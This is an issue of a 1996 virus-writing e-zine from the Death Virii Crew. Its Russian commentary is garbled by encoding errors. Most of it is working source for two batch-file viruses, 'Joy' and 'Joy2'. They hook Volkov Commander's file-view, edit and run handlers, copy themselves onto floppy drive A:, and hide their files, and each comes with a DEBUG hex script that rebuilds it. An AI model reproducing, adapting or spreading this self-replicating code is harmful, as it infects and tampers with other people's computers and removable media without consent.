[Death Virii Crew] Presents
CHAOS A.D. Vmag, Issue 1, May 1996				file 006


		      ����� ��ࠦ��騩 �� ���⥭��. 
						      by Reminder

- ����� ����ᠭ �᪫��⥫쭮 ��� ࠡ��� � �����窮� VC
- ����� ����ᠭ �� BAT �몥

 
   �ਭ樯 ����⢨� ����� - � ��室���� �����. ;)


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

���� joy.bat - �ਣ������, ��ࢮ��砫�� ����� ��� VC 
;=========================== १��� ��� ============================
@echo off
:[Joy] (C)by Reminder
if not %1==A: goto e
if not exist c:\vc\vc.com goto e
if exist c:\vc\vc.bat goto n
echo  @vc.bat !:>>c:\vc\vcview.ext
copy vc.bat c:\vc\vc.bat>nul
:n
if exist vcview.ext goto e
copy c:\vc\vc.bat %1\vc.bat>nul
copy c:\vc\vcview.ext %1\vcview.ext>nul      
:e
;=========================== १��� ��� ============================
�������� 300 ����

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

���� JOY.SCR
����᪠�� - DEBUG < JOY.SCR (������ JOY.BAT)
;=========================== १��� ��� ============================
 N JOY.BAT
 E 0100 40 65 63 68 6F 20 6F 66 66 0D 0A 3A 5B 4A 6F 79
 E 0110 5D 20 28 43 29 62 79 20 52 65 6D 69 6E 64 65 72
 E 0120 0D 0A 69 66 20 6E 6F 74 20 25 31 3D 3D 41 3A 20
 E 0130 67 6F 74 6F 20 65 0D 0A 69 66 20 6E 6F 74 20 65
 E 0140 78 69 73 74 20 63 3A 5C 76 63 5C 76 63 2E 63 6F
 E 0150 6D 20 67 6F 74 6F 20 65 0D 0A 69 66 20 65 78 69
 E 0160 73 74 20 63 3A 5C 76 63 5C 76 63 2E 62 61 74 20
 E 0170 67 6F 74 6F 20 6E 0D 0A 65 63 68 6F 20 20 40 76
 E 0180 63 2E 62 61 74 20 21 3A 3E 3E 63 3A 5C 76 63 5C
 E 0190 76 63 76 69 65 77 2E 65 78 74 0D 0A 63 6F 70 79
 E 01A0 20 76 63 2E 62 61 74 20 63 3A 5C 76 63 5C 76 63
 E 01B0 2E 62 61 74 3E 6E 75 6C 0D 0A 3A 6E 0D 0A 69 66
 E 01C0 20 65 78 69 73 74 20 76 63 76 69 65 77 2E 65 78
 E 01D0 74 20 67 6F 74 6F 20 65 0D 0A 63 6F 70 79 20 63
 E 01E0 3A 5C 76 63 5C 76 63 2E 62 61 74 20 25 31 5C 76
 E 01F0 63 2E 62 61 74 3E 6E 75 6C 0D 0A 63 6F 70 79 20
 E 0200 63 3A 5C 76 63 5C 76 63 76 69 65 77 2E 65 78 74
 E 0210 20 25 31 5C 76 63 76 69 65 77 2E 65 78 74 3E 6E
 E 0220 75 6C 20 20 20 20 20 20 0D 0A 3A 65
 RCX
 012C
 W
 Q
;=========================== १��� ��� ============================


\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

���� Joy2.bat - �த������ ��ਠ�� JOY.BAT 
 - ࠡ�� � ��ਡ�⠬�
 - ��ࠦ���� �� ⮫쪮 �� ��ᬮ�� 䠩��,
   (�� � �� ����᪥ � ����⨨ �� ।���஢���� )   

;=========================== १��� ��� ============================
@echo off
if not %1==A: goto e
if not exist c:\vc\vc.com goto e
if exist c:\vc\vc.bat goto n
echo  @vc.bat !: !.! V>>c:\vc\vcview.ext
echo  @vc.bat !: !.! E>>c:\vc\vcedit.ext
echo *: @vc.bat !: !.! R>>c:\vc\vc.ext
type vc.bat>c:\vc\vc.bat
if not exist c:\dos\attrib.* goto n
attrib +H c:\vc\vc.bat
:n
if exist %1\vcview.ext goto e
type c:\vc\vc.bat>%1\vc.bat
type c:\vc\vcview.ext>%1\vcview.ext      
type c:\vc\vcedit.ext>%1\vcedit.ext
type c:\vc\vc.ext>%1\vc.ext
if not exist c:\dos\attrib.* goto e
attrib +H %1\vc*.* 
:e
if not %3==R goto d
[Joy2] Original idea by Reminder
:d 
;=========================== १��� ��� ============================
�������� 600 ����.

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\


���� JOY2.SCR
����᪠�� - DEBUG < JOY2.SCR (������ JOY2.BAT)
;=========================== १��� ��� ============================
 N JOY2.BAT
 E 0100 40 65 63 68 6F 20 6F 66 66 0D 0A 69 66 20 6E 6F
 E 0110 74 20 25 31 3D 3D 41 3A 20 67 6F 74 6F 20 65 0D
 E 0120 0A 69 66 20 6E 6F 74 20 65 78 69 73 74 20 63 3A
 E 0130 5C 76 63 5C 76 63 2E 63 6F 6D 20 67 6F 74 6F 20
 E 0140 65 0D 0A 69 66 20 65 78 69 73 74 20 63 3A 5C 76
 E 0150 63 5C 76 63 2E 62 61 74 20 67 6F 74 6F 20 6E 0D
 E 0160 0A 65 63 68 6F 20 20 40 76 63 2E 62 61 74 20 21
 E 0170 3A 20 21 2E 21 20 56 3E 3E 63 3A 5C 76 63 5C 76
 E 0180 63 76 69 65 77 2E 65 78 74 0D 0A 65 63 68 6F 20
 E 0190 20 40 76 63 2E 62 61 74 20 21 3A 20 21 2E 21 20
 E 01A0 45 3E 3E 63 3A 5C 76 63 5C 76 63 65 64 69 74 2E
 E 01B0 65 78 74 0D 0A 65 63 68 6F 20 2A 3A 20 40 76 63
 E 01C0 2E 62 61 74 20 21 3A 20 21 2E 21 20 52 3E 3E 63
 E 01D0 3A 5C 76 63 5C 76 63 2E 65 78 74 0D 0A 74 79 70
 E 01E0 65 20 76 63 2E 62 61 74 3E 63 3A 5C 76 63 5C 76
 E 01F0 63 2E 62 61 74 0D 0A 69 66 20 6E 6F 74 20 65 78
 E 0200 69 73 74 20 63 3A 5C 64 6F 73 5C 61 74 74 72 69
 E 0210 62 2E 2A 20 67 6F 74 6F 20 6E 0D 0A 61 74 74 72
 E 0220 69 62 20 2B 48 20 63 3A 5C 76 63 5C 76 63 2E 62
 E 0230 61 74 0D 0A 3A 6E 0D 0A 69 66 20 65 78 69 73 74
 E 0240 20 25 31 5C 76 63 76 69 65 77 2E 65 78 74 20 67
 E 0250 6F 74 6F 20 65 0D 0A 74 79 70 65 20 63 3A 5C 76
 E 0260 63 5C 76 63 2E 62 61 74 3E 25 31 5C 76 63 2E 62
 E 0270 61 74 0D 0A 74 79 70 65 20 63 3A 5C 76 63 5C 76
 E 0280 63 76 69 65 77 2E 65 78 74 3E 25 31 5C 76 63 76
 E 0290 69 65 77 2E 65 78 74 20 20 20 20 20 20 0D 0A 74
 E 02A0 79 70 65 20 63 3A 5C 76 63 5C 76 63 65 64 69 74
 E 02B0 2E 65 78 74 3E 25 31 5C 76 63 65 64 69 74 2E 65
 E 02C0 78 74 0D 0A 74 79 70 65 20 63 3A 5C 76 63 5C 76
 E 02D0 63 2E 65 78 74 3E 25 31 5C 76 63 2E 65 78 74 0D
 E 02E0 0A 69 66 20 6E 6F 74 20 65 78 69 73 74 20 63 3A
 E 02F0 5C 64 6F 73 5C 61 74 74 72 69 62 2E 2A 20 67 6F
 E 0300 74 6F 20 65 0D 0A 61 74 74 72 69 62 20 2B 48 20
 E 0310 25 31 5C 76 63 2A 2E 2A 20 0D 0A 3A 65 0D 0A 69
 E 0320 66 20 6E 6F 74 20 25 33 3D 3D 52 20 67 6F 74 6F
 E 0330 20 64 0D 0A 5B 4A 6F 79 32 5D 20 4F 72 69 67 69
 E 0340 6E 61 6C 20 69 64 65 61 20 62 79 20 52 65 6D 69
 E 0350 6E 64 65 72 0D 0A 3A 64
 RCX
 0258
 W
 Q
;=========================== १��� ��� ============================

				(C) by Reminder [DVC]
